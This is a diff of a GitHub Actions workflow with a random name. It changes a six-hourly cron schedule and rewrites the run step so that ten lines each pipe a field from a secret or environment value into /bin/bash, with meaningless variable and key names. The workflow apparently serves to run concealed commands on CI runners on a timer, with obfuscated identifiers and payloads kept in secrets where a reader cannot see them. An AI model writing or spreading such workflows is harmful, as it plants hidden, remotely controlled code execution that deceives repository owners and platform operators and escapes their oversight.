@@ -1,10 +1,8 @@
 name: wanghuangshang4982
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 1/6 * * *'
-
+    - cron: '6 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +10,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: wanghuangshang4982
         env:
-          y250: ${{ secrets.y250 }}
+          ayahc21: ${{ secrets.ayahc21 }}
         run: |
-          echo $y250 | jq -r .hmw85682 | /bin/bash
-          echo $flb619 | jq -r .w160 | /bin/bash
-          echo $wusk56 | jq -r .ll9 | /bin/bash
-          echo $ukjul3 | jq -r .qg9 | /bin/bash
-          echo $kmjt6264 | jq -r .kgcz5 | /bin/bash
-          echo $w64674 | jq -r .ub417 | /bin/bash
-          echo $vbsay00283 | jq -r .h017 | /bin/bash
-          echo $olfsk8648 | jq -r .akbb19 | /bin/bash
-          echo $o13765 | jq -r .wjjbu8662 | /bin/bash
-          echo $lzlnq10988 | jq -r .fwuu74027 | /bin/bash
-          echo $ni7 | jq -r .wxmw912 | /bin/bash
+          echo $ayahc21 | jq -r .vgvu6 | /bin/bash
+          echo $u447 | jq -r .tjpqu44420 | /bin/bash
+          echo $w541 | jq -r .rqqal75 | /bin/bash
+          echo $y4777 | jq -r .nrwi9 | /bin/bash
+          echo $e4 | jq -r .yw93 | /bin/bash
+          echo $twbp029 | jq -r .cojcm3961 | /bin/bash
+          echo $orvir02741 | jq -r .n5406 | /bin/bash
+          echo $ggzb8742 | jq -r .ltqdv009 | /bin/bash
+          echo $jq4239 | jq -r .f89 | /bin/bash
+          echo $wwgz69211 | jq -r .vt79659 | /bin/bash
 
